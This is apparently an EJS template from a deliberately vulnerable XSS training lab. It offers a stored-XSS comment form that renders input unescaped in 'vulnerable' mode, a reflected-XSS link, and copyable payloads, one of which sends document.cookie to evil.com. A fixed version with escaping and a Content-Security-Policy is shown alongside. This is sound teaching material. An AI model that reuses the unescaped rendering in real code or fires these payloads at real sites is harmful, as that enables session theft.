<% const title = 'XSS Lab' %>
<%- include('../partials/head') %>

<div class="lab-page">
  <div class="lab-header">
    <div class="breadcrumb"><a href="/">Dashboard</a> / Cross-Site Scripting</div>
    <h1>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m7 8-4 4 4 4"/><path d="m17 8 4 4-4 4"/><path d="m14 4-4 16"/></svg>
      Cross-Site Scripting (XSS)
    </h1>
    <p class="desc">Inject JavaScript through user input. The vulnerable version renders HTML/JS directly in the page without sanitization, allowing script execution in the victim's browser.</p>
  </div>

  <div class="mode-toggle">
    <button data-mode="vulnerable" class="active" onclick="setMode('vulnerable')">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/></svg>
      Vulnerable
    </button>
    <button data-mode="fixed" onclick="setMode('fixed')">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
      Fixed
    </button>
  </div>

  <div class="info-box">
    <h3>What to try</h3>
    <ul>
      <li>Type a normal comment like <strong>Hello world</strong></li>
      <li>Try <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
      <li>Try <code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></li>
      <li>Try the reflected XSS link below</li>
    </ul>
  </div>

  <h3 style="margin-bottom: 14px; font-size: 0.95rem;">Stored XSS</h3>
  <form method="POST" action="/labs/xss">
    <input type="hidden" name="mode" id="mode-input" value="vulnerable">
    <div class="form-group">
      <label>Post a Comment</label>
      <textarea name="comment" placeholder="Write a comment..."><%= query %></textarea>
    </div>
    <button type="submit" class="btn btn-primary">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
      Post Comment
    </button>
  </form>

  <% if (output) { %>
    <div class="result-box <%= escaped ? 'safe' : 'vulnerable' %>" style="margin-top: 18px">
      <h4 class="<%= escaped ? 'safe-label' : 'vuln-label' %>">
        <%= escaped ? 'Output (Escaped)' : 'Output (Raw HTML)' %>
      </h4>
      <div style="padding: 12px; background: var(--bg-input); border-radius: var(--radius-sm);">
        <% if (escaped) { %>
          <%= output %>
        <% } else { %>
          <%- output %>
        <% } %>
      </div>
    </div>
  <% } %>

  <div style="margin-top: 28px">
    <h3 style="margin-bottom: 14px; font-size: 0.95rem;">Reflected XSS</h3>
    <p style="color: var(--text-muted); font-size: 0.88rem; margin-bottom: 12px">
      The search parameter is reflected in the page without sanitization:
    </p>
    <div class="payload-item">
      <code>/labs/xss/search?q=&lt;script&gt;alert('reflected')&lt;/script&gt;</code>
      <a href="/labs/xss/search?q=<script>alert('reflected XSS')</script>" class="btn btn-danger" style="font-size: 0.8rem; padding: 6px 14px;">Test Vuln</a>
    </div>
    <div class="payload-item">
      <code>/labs/xss/search?q=...&amp;mode=fixed</code>
      <a href="/labs/xss/search?q=<script>alert('reflected XSS')</script>&mode=fixed" class="btn btn-outline" style="font-size: 0.8rem; padding: 6px 14px;">Test Fixed</a>
    </div>
  </div>

  <div class="exploit-panel">
    <h3>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h9l-1 8 10-12h-9l1-8z"/></svg>
      Sample Payloads
    </h3>
    <div class="payload-item">
      <div>
        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
        <div class="desc">Basic script injection</div>
      </div>
      <button class="copy-btn" onclick="copyPayload(`<script>alert('XSS')</script>`, this)">Copy</button>
    </div>
    <div class="payload-item">
      <div>
        <code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code>
        <div class="desc">Event handler</div>
      </div>
      <button class="copy-btn" onclick="copyPayload(`<img src=x onerror=\"alert(document.cookie)\">`, this)">Copy</button>
    </div>
    <div class="payload-item">
      <div>
        <code>&lt;svg onload="fetch('https://evil.com?c='+document.cookie)"&gt;</code>
        <div class="desc">Cookie exfiltration</div>
      </div>
      <button class="copy-btn" onclick="copyPayload(`<svg onload=\"fetch('https://evil.com?c='+document.cookie)\">`, this)">Copy</button>
    </div>
  </div>

  <div class="code-compare">
    <div class="code-block">
      <div class="code-header vuln">Vulnerable Code</div>
      <pre><span class="comment">&lt;!-- EJS raw output - renders HTML --&gt;</span>
&lt;div&gt;<span class="highlight">&lt;%- output %&gt;</span>&lt;/div&gt;

<span class="comment">// No sanitization on input</span>
res.render(<span class="string">'xss'</span>, { output: comment });</pre>
    </div>
    <div class="code-block">
      <div class="code-header safe">Fixed Code</div>
      <pre><span class="comment">&lt;!-- EJS escaped output --&gt;</span>
&lt;div&gt;<span class="safe-hl">&lt;%= output %&gt;</span>&lt;/div&gt;

<span class="comment">// Also set Content-Security-Policy</span>
res.setHeader(<span class="string">'Content-Security-Policy'</span>,
  <span class="string">"default-src 'self'"</span>);</pre>
    </div>
  </div>
</div>

<%- include('../partials/footer') %>
